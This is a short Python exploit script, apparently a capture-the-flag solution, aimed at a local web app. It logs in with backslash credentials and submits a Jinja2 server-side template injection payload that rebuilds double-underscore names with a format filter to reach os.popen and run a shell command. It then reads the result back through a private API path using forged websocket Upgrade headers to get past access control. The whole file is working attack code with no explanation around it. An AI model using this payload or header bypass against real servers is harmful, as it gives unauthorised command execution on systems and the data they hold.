import httpx

r = httpx.Client()

username = "\\"
password = "\\"

payload = '''{%set u="%c%c"|format(95,95)%}
{%print(request|attr("application")|attr(u~"globals"~u)|attr(u~"getitem"~u)(u~"builtins"~u)|attr(u~"getitem"~u)(u~"import"~u)('os')|attr('popen')("id")|attr('read')())%}'''

custom_connection = "Upgrade"
custom_upgrade = "websocket"

def login():
    r = httpx.post("http://localhost:7000/login", data={"username": username, "password": password})
    if r.status_code == 301:
        print("Login successful!")

def send_feedback():
    r = httpx.post("http://localhost:7000/send-feedback", data={"feedback": payload})
    id = r.json()["feedback_id"]
    return id
    # print(f"Feedback ID: {id}")

def get_feedback(id):
    r = httpx.get(f"http://localhost:7000/api/private/feedback/{id}.txt", headers={"Connection": custom_connection, "Upgrade": custom_upgrade})
    print(r.text)

if __name__ == "__main__":
    login()
    get_feedback(send_feedback())